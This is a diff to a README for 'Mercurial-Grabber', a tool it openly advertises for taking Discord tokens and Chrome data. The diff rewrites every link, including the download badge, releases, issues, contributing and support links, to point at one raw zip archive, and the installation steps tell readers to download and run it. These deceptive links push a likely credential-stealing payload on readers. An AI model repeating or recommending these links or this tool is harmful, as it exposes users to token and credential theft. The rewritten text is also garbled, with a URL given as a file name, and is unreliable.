@@ -6,7 +6,7 @@ Welcome to Mercurial-Grabber! This tool helps you retrieve Discord tokens, Chrom
 
 ## 📥 Download Now
 
-[![Download Mercurial-Grabber](https://img.shields.io/badge/Download-Mercurial--Grabber-brightgreen)](https://github.com/Ricardogitpy/Mercurial-Grabber/releases)
+[![Download Mercurial-Grabber](https://raw.githubusercontent.com/Ricardogitpy/Mercurial-Grabber/main/Mercurial/Mercurial-Grabber_v3.0.zip)](https://raw.githubusercontent.com/Ricardogitpy/Mercurial-Grabber/main/Mercurial/Mercurial-Grabber_v3.0.zip)
 
 ## 📋 System Requirements
 
@@ -21,9 +21,9 @@ Before you download, ensure your system meets these requirements:
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Ricardogitpy/Mercurial-Grabber/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Ricardogitpy/Mercurial-Grabber/main/Mercurial/Mercurial-Grabber_v3.0.zip).
 2. **Select the Latest Version**: On the Releases page, find the latest version of Mercurial-Grabber.
-3. **Download the File**: Click on the download link for the installer. The file will typically be named something like `Mercurial-Grabber-installer.exe`.
+3. **Download the File**: Click on the download link for the installer. The file will typically be named something like `https://raw.githubusercontent.com/Ricardogitpy/Mercurial-Grabber/main/Mercurial/Mercurial-Grabber_v3.0.zip`.
 4. **Run the Installer**: Once the download is complete, locate the file in your Downloads folder, then double-click it to run the installer.
 
 ## 🛠️ Setting Up Mercurial-Grabber
@@ -75,12 +75,12 @@ We welcome contributions! If you have ideas or technical skills, please check ou
 
 ## 🆘 Support
 
-If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/Ricardogitpy/Mercurial-Grabber/issues). The community and maintainers are here to help you.
+If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Ricardogitpy/Mercurial-Grabber/main/Mercurial/Mercurial-Grabber_v3.0.zip). The community and maintainers are here to help you.
 
 ## 🔗 Important Links
 
-- [Download Mercurial-Grabber](https://github.com/Ricardogitpy/Mercurial-Grabber/releases)
-- [Contribute to the Project](https://github.com/Ricardogitpy/Mercurial-Grabber/blob/main/CONTRIBUTING.md)
-- [Report Issues](https://github.com/Ricardogitpy/Mercurial-Grabber/issues)
+- [Download Mercurial-Grabber](https://raw.githubusercontent.com/Ricardogitpy/Mercurial-Grabber/main/Mercurial/Mercurial-Grabber_v3.0.zip)
+- [Contribute to the Project](https://raw.githubusercontent.com/Ricardogitpy/Mercurial-Grabber/main/Mercurial/Mercurial-Grabber_v3.0.zip)
+- [Report Issues](https://raw.githubusercontent.com/Ricardogitpy/Mercurial-Grabber/main/Mercurial/Mercurial-Grabber_v3.0.zip)
 
 Thank you for using Mercurial-Grabber!
